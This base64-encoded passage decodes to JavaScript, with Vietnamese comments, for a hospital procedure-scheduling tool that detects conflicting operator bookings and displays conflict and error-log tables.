V0bGllcnMgPSAwOw0KICBPYmplY3QudmFsdWVzKGNvdW50c0J5RGF0ZSkuZm9yRWFjaChtYXAgPT4gew0KICAgIGNvbnN0IGVudHJpZXMgPSBPYmplY3QuZW50cmllcyhtYXApLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgY29uc3QgdG9wID0gZW50cmllc1swXTsgaWYgKCF0b3ApIHJldHVybjsNCiAgICBjb25zdCB0b3BOYW1lID0gdG9wWzBdOw0KICAgIGVudHJpZXMuZm9yRWFjaCgoW25hbWUsIGNudF0pID0+IHsgaWYgKG5hbWUgIT09IHRvcE5hbWUpIG91dGxpZXJzICs9IGNudDsgfSk7DQogIH0pOw0KICByZXR1cm4gb3V0bGllcnM7DQp9DQoNCi8vIMSQ4bq/bSBs4buXaSBzYWkgdGjhu51pIGdpYW4gKGvhur90IHRow7pjIDw9IGLhuq90IMSR4bqndSwgxJHhu4tuaCBk4bqhbmcgc2FpLCBzYWkgcGjDunQgc28gduG7m2kgcXV5IMSR4buLbmgsLi4uKQ0KZnVuY3Rpb24gZ2V0VGltZUVycm9yVG90YWwoKSB7DQogIC8vIMSQ4bq/bSDEkcO6bmcgdGhlbyBz4buRIGjDoG5nIGzhu5dpIMSRYW5nIGhp4buDbiB0aOG7iw0KICBjb25zdCBjb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JMb2cnKTsgLy8gdsO5bmcgYuG6o25nIGzhu5dpIHRo4budaSBnaWFuDQogIGlmICghY29udGFpbmVyKSByZXR1cm4gMDsNCiAgcmV0dXJuIGNvbnRhaW5lci5xdWVyeVNlbGVjdG9yQWxsKCd0ci5lcnJvci1yb3cnKS5sZW5ndGg7DQp9DQoNCmZ1bmN0aW9uIGdldENvbmZsaWN0VG90YWwoKSB7DQogIC8vIMSQ4bq/bSDEkcO6bmcgdGhlbyBz4buRIGjDoG5nIHh1bmcgxJHhu5l0IHRyb25nIGvhur90IHF14bqjDQogIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsgLy8gdGJvZHkgY+G7p2EgYuG6o25nIGvhur90IHF14bqjDQogIGlmICghdGJvZHkpIHJldHVybiAwOw0KICByZXR1cm4gdGJvZHkucXVlcnlTZWxlY3RvckFsbCgndHIuY29uZmxpY3Qtcm93JykubGVuZ3RoOw0KfQ0KDQoNCg0KDQoNCg0KDQoNCiAgICAgICBmdW5jdGlvbiBkaXNwbGF5UmVzdWx0cyhwcm9jZWR1cmVzLCBza2lwcGVkUm93cyA9IDApIHsNCiAgICBhbGxQcm9jZWR1cmVzID0gcHJvY2VkdXJlczsNCiAgICANCiAgICBjb25zdCBvcGVyYXRvcnMgPSBbLi4ubmV3IFNldChwcm9jZWR1cmVzLm1hcChwID0+IHAub3BlcmF0b3IpKV07DQogICAgY29uc3Qgb3BlcmF0b3JTZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdEVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArIA0KICAgICAgICBvcGVyYXRvcnMubWFwKG9wID0+IGA8b3B0aW9uIHZhbHVlPSIke29wfSI+JHtvcC5yZXBsYWNlKC8sL2csICcnKX08L29wdGlvbj5gKS5qb2luKCcnKTsNCiAgICANCiAgICBvcGVyYXRvclNlbGVjdEVycm9yLmlubmVySFRNTCA9IG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTDsgLy8gxJDhu5NuZyBi4buZIG7hu5lpIGR1bmcNCiAgICANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JGaWx0ZXInKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JGaWx0ZXJFcnJvcicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBjb25mbGljdFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuY29uZmxpY3QpOw0KICAgICAgICAgICAgY29uc3QgY29uZmxpY3RDb3VudCA9IGNvbmZsaWN0UHJvY2VkdXJlcy5sZW5ndGg7DQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBO4bq/dSBraMO0bmcgY8OzIGzhu5dpLCBjdeG7mW4geHXhu5FuZyBwaOG6p24ga+G6v3QgcXXhuqMNCiAgICBpZiAoZXJyb3JMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICAgICAgY29uc3QgcmVzdWx0U2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJyk7DQogICAgICAgICAgICBpZiAocmVzdWx0U2VjdGlvbikgew0KICAgICAgICAgICAgICAgIHNtb290aFNjcm9sbFRvKHJlc3VsdFNlY3Rpb24sIC00MCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0sIDMwMCk7DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBmaWx0ZXJCeU9wZXJhdG9yKCkgew0KICAgIGNvbnN0IG9wZXJhdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykudmFsdWU7DQoNCiBjb25zdCBzaG93RG9jdG9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QudG9nZ2xlKCdzaG93LWRvY3RvcicsIHNob3dEb2N0b3IpOw0KICAgIC8vID09PT09IDEuIEzhu4xDIFbDgCBISeG7gk4gVEjhu4ogQuG6ok5HIEvhur5UIFFV4bqiIEtJ4buCTSBUUkEgWFVORyDEkOG7mFQgPT09PT0NCiAgICBjb25zdCBmaWx0ZXJlZFByb2NlZHVyZXMgPSBvcGVyYXRvciA9PT0gJ2FsbCcgDQogICAgICAgID8gYWxsUHJvY2VkdXJlcy5maWx0ZXIocCA9PiBwLmNvbmZsaWN0KSANCiAgICAgICAgOiBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpICYmIHAuY29uZmxpY3QpOw0KDQogICAgY29uc3QgcmVzdWx0Qm9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRCb2R5Jyk7DQogICAgcmVzdWx0Qm9keS5pbm5lckhUTUwgPSAnJzsNCg0KICAgIC8vIE5ow7NtIGPDoWMgdGjhu6cgdGh14bqtdCB4dW5nIMSR4buZdCB24bubaSBuaGF1DQogICAgY29uc3QgY29uZmxpY3RHcm91cHMgPSBbXTsNCiAgICBjb25zdCBwcm9jZXNzZWRSb3dzID0gbmV3IFNldCgpOw0KDQogICAgZmlsdGVyZWRQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvY2Vzc2VkUm93cy5oYXMocHJvYy5yb3dJbmRleCkpIHsNCiAgICAgICAgICAgIGNvbnN0IGdyb3VwID0gW3Byb2NdOw0KICAgICAgICAgICAgcHJvY2Vzc2VkUm93cy5hZGQocHJvYy5yb3dJbmRleCk7DQoNCiAgICAgICAgICAgIC8vIFTDrG0gdGjhu6cgdGh14bqtdCBsacOqbiBxdWFuIHRyb25nIHh1bmcgxJHhu5l0DQogICAgICAgICAgICBpZiAocHJvYy5jb25mbGljdFJlYXNvbikgew0KICAgICAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0TWF0Y2hlcyA9IHByb2MuY29uZmxpY3RSZWFzb24ubWF0Y2goL0Lhu4duaCBuaMOibjogKC4qPyk8YnI+4oCiIE5nw6B5OiAoLio/KTxicj7igKIgVGjhu51pIGdpYW46ICguKj8pLS9nKTsNCiAgICAgICAgICAgICAgICBpZiAoY29uZmxpY3RNYXRjaGVzKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0TWF0Y2hlcy5mb3JFYWNoKG1hdGNoID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHBhdGllbnROYW1lID0gbWF0Y2gubWF0Y2goL0Lhu4duaCBuaMOibjogKC4qPyk8YnI+LylbMV07DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBkYXRlID0gbWF0Y2gubWF0Y2goL05nw6B5OiAoLio/KTxicj4vKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWUgPSBtYXRjaC5tYXRjaCgvVGjhu51pIGdpYW46ICguKj8pLS8pWzFdOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBjb25mbGljdFByb2MgPSBmaWx0ZXJlZFByb2NlZHVyZXMuZmluZChwID0+IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAucGF0aWVudE5hbWUgPT09IHBhdGllbnROYW1lICYmIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuZGF0ZSA9PT0gZGF0ZSAmJiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLmRpc3BsYXlTdGFydCA9PT0gdGltZSAmJg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICFwcm9jZXNzZWRSb3dzLmhhcyhwLnJvd0luZGV4KQ0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvbmZsaWN0UHJvYykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdyb3VwLnB1c2goY29uZmxpY3RQcm9jKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZXNzZWRSb3dzLmFkZChjb25mbGljdFByb2Mucm93SW5kZXgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjb25mbGljdEdyb3Vwcy5wdXNoKGdyb3VwKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KDQogICAvLyBIaeG7g24gdGjhu4sga+G6v3QgcXXhuqMNCiAgICBjb25mbGljdEdyb3Vwcy5mb3JFYWNoKGdyb3VwID0+IHsNCiAgICAgICAgZ3JvdXAuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICByb3cuY2xhc3NMaXN0LmFkZCgiaGVyYi1yb3ciKTsNCiAgICAgICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCdjb25mbGljdC1yb3cnKTsNCiAgICAgICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wYXRpZW50TmFtZX0gPGJyLz4gJHtwcm9jLnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtwcm9jLmRhdGV9PGJyLz4ke3Byb2MuZGlzcGxheVN0YXJ0fSAtICR7cHJvYy5kaXNwbGF5RW5kfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke3Byb2MuZG9jdG9yfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0idGltZS1zdWdnZXN0aW9uIj4ke3Byb2Muc3VnZ2VzdGlvbiB8fCAnS2jDtG5nIGPDsyB4dW5nIMSR4buZdCd9PC90ZD4NCiAgICAgICAgICAgIGA7DQogICAgICAgICAgICByZXN1bHRCb2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgICAgIH0pOw0KDQogICAgICAgIC8vIFRow6ptIGTDsm5nIHBow6JuIGPDoWNoDQogICAgICAgIGlmIChncm91cC5sZW5ndGggPiAwKSB7DQogICAgICAgICAgICBjb25zdCBzZXBhcmF0b3IgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICAgICAgc2VwYXJhdG9yLmlubmVySFRNTCA9ICc8dGQgY29sc3Bhbj0iOCIgY2xhc3M9Imdyb3VwLXNlcGFyYXRvciI+PC90ZD4nOw0KICAgICAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChzZXBhcmF0b3IpOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgICAvLyBO4bq/dSBraMO0bmcgY8OzIG5ow7NtIG7DoG8gdGjDrCB0aMOqbSBkw7JuZyBiw6FvICJLaMO0bmcgY8OzIGzhu5dpIg0KICAgIGlmIChjb25mbGljdEdyb3Vwcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI1ImNsYXNzPSJoZXJiLXJvdyBjb25mbGljdC1yb3ciPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC90ZD4NCiAgICAgICAgYDsNCiAgICAgICAgcmVzdWx0Qm9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0NCg0KICAgIC8vID09PT09IDIuIEzhu4xDIFbDgCBISeG7gk4gVEjhu4ogQuG6ok5HIEzhu5ZJID09PT09DQpjb25zdCBvcGVyYXRvckVycm9yID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0RXJyb3InKS52YWx1ZTsNCiBjb25zdCBmaWx0ZXJlZEVycm9ycyA9IG9wZXJhdG9yRXJyb3IgPT09ICdhbGwnIA0KICAgPyBlcnJvckxvZyANCiAgIDogZXJyb3JMb2cuZmlsdGVyKGVycm9yID0+DQogICAgICAgZXJyb3IuZGV0YWlscyAmJg0KICAgICAgZXJyb3IuZGV0YWlscy5vcGVyYXRvciAmJg0KICAgICAgIGVycm9yLmRldGFpbHMub3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgPT09IG9wZXJhdG9yRXJyb3IucmVwbGFjZSgvLC9nLCAnJykNCiAgICApOw0KDQogICAgLy8gSGnhu4NuIHRo4buLIGzhu5dpIMSRw6MgbOG7jWMNCiAgICBjb25zdCBlcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gYDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgICA8dHI+DQogICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PiA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiIGNsYXNzPSJlcnJvci1kZXRhaWwiPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC90ZD48L3RyPjwvdGJvZHk+PC90YWJsZT5gOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW1kIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFyIGZhLWNsb2NrIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTOG7l2k8L3RoPg0KICAgICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5PmA7DQoNCiAgICBmaWx0ZXJlZEVycm9ycy5mb3JFYWNoKGVycm9yID0+IHsNCiAgICAgICAgaWYgKGVycm9yLmRldGFpbHMpIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMucGF0aWVudE5hbWUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wcm9jZWR1cmUgfHwgJ0tow7RuZyBjw7MnfTwvdGQ+DQoJCQkJPHRkIGNsYXNzPSJkb2N0b3ItY29sdW1uIj4ke2Vycm9yLmRldGFpbHMuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD4ke2Vycm9yLmRldGFpbHMub3BlcmF0b3IgPyBlcnJvci5kZXRhaWxzLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpIDogJ0tow7RuZyBjw7MnfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kZXRhaWxzLm5nYXlUaHVjSGllbiB8fCAoZXJyb3IuZGV0YWlscy5kYXRlIHx8ICdLaMO0bmcgY8OzJyl9IDxici8+JHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3IuZGV0YWlscy5zdGFydFRpbWUgPyBgJHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZX0gLSAke2Vycm9yLmRldGFpbHMuZW5kVGltZX1gIDogJ0tow7RuZyBjw7MnDQogICAgICAgICAgICAgICAgfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZCA/IGAke2Vycm9yLmRldGFpbHMuYWN0dWFsfSBwaMO6dCAoUXV5IMSR4buLbmg6ICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZH0gcGjDunQpYCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBodG1sICs9IGANCiAgICAgICAgICAgIDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNSIgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IubWVzc2FnZX0gJHtlcnJvci5yb3cgPyAnKETDsm5nICcgKyBlcnJvci5yb3cgKyAnKScgOiAnJ30NCiAgICAgICAgICAgICAgICA8L3RkPg0KICAgICAgICAgICAgPC90cj5gOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQpmdW5jdGlvbiBkaXNwbGF5RmlsdGVyZWRFcnJvcnMoZmlsdGVyZWRFcnJvcnMpIHsNCiAgICBjb25zdCBlcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIA0KICAgIGlmIChmaWx0ZXJlZEVycm9ycy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXIgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFTDqm4gQk48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtcHJvY2VkdXJlcyBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu6cgdGh14bqtdDwvdGg+DQogICAgICAgICAgICA8dGggY2xhc3M9ImRvY3Rvci1jb2x1bW4iPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gQsOhYyBz4bu5IGNo4buJIMSR4buLbmg8L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1udXJzZSBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtZXhjbGFtYXRpb24tdHJpYW5nbGUgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+DQogICAgICAgIDwvdGhlYWQ+DQogICAgICAgIDx0Ym9keT5gOw0KICAgIA0KICAgIGZpbHRlcmVkRXJyb3JzLmZvckVhY2goZXJyb3IgPT4gew0KICAgICAgICBpZiAoZXJyb3IuZGV0YWlscykgew0KICAgICAgICAgICAgaHRtbCArPSBgDQogICAgICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICAgICAgPHRkPiR7ZXJyb3IuZGV0YWlscy5wYXRpZW50TmFtZSB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLnByb2NlZHVyZSB8fCAnS2jDtG5nIGPDsyd9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtlcnJvci5kZXRhaWxzLm9wZXJhdG9yID8gZXJyb3IuZGV0YWlscy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA6ICdLaMO0bmcgY8OzJ308L3RkPg0KICAgICAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3IuZGV0YWlscy5uZ2F5VGh1Y0hpZW4gfHwgKGVycm9yLmRldGFpbHMuZGF0ZSB8fCAnS2jDtG5nIGPDsycpfSA8YnIvPiR7ZXJyb3IuZGV0YWlscy5zdGFydFRpbWUgPyBgJHtlcnJvci5kZXRhaWxzLnN0YXJ0VGltZX0gLSAke2Vycm9yLmRldGFpbHMuZW5kVGltZX1gIDogJ0tow7RuZyBjw7MnfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJlcnJvci1kZXRhaWwiPg0KICAgICAgICAgICAgICAgICAgICAke2Vycm9yLm1lc3NhZ2V9DQogICAgICAgICAgICAgICAgICAgICR7ZXJyb3IuZGV0YWlscy5leHBlY3RlZCA/IGAke2Vycm9yLmRldGFpbHMuYWN0dWFsfSBwaMO6dCAgIChRdXkgxJHhu4tuaDogJHtlcnJvci5kZXRhaWxzLmV4cGVjdGVkfSBwaMO6dClgIDogJyd9DQogICAgICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDwvdHI+YDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGh0bWwgKz0gYA0KICAgICAgICAgICAgPHRyIGNsYXNzPSJlcnJvci1yb3ciPg0KICAgICAgICAgICAgICAgIDx0ZCBjb2xzcGFuPSI2IiBjbGFzcz0iZXJyb3ItZGV0YWlsIj4NCiAgICAgICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSAke2Vycm9yLnJvdyA/ICcoRMOybmcgJyArIGVycm9yLnJvdyArICcpJyA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICA8L3RyPmA7DQogICAgICAgIH0NCiAgICB9KTsNCiAgICANCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBodG1sOw0KfQ0KDQogICAgICAgIGZ1bmN0aW9uIGxvZ0Vycm9yKG1lc3NhZ2UsIHJvdyA9IG51bGwsIGRldGFpbHMgPSBudWxsKSB7DQogICAgICAgICAgICBlcnJvckxvZy5wdXNoKHsNCiAgICAgICAgICAgICAgICBtZXNzYWdlLA0KICAgICAgICAgICAgICAgIHJvdywNCiAgICAgICAgICAgICAgICBkZXRhaWxzLA0KICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0xvY2FsZVRpbWVTdHJpbmcoKSwNCiAgICAgICAgICAgICAgICB1c2VyOiBjdXJyZW50VXNlcg0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCg0KZnVuY3Rpb24gZGlzcGxheUVycm9ycygpIHsNCiAgICBjb25zdCBlcnJvckxvZ0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOw0KICAgIA0KICAgIGlmIChlcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgZXJyb3JMb2dEaXYuaW5uZXJIVE1MID0gJzxwPktow7RuZyBjw7MgbOG7l2kgbsOgbyDEkcaw4bujYyBnaGkgbmjhuq1uPC9wPic7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICANCiAgICAgICAgLy8gTuG6v3Uga2jDtG5nIGPDsyBs4buXaSwgY3Xhu5luIHh14buRbmcgcGjhuqduIEvhur90IFF14bqjIEtp4buDbSBUcmENCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgICAgICBjb25zdCByZXN1bHRTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWV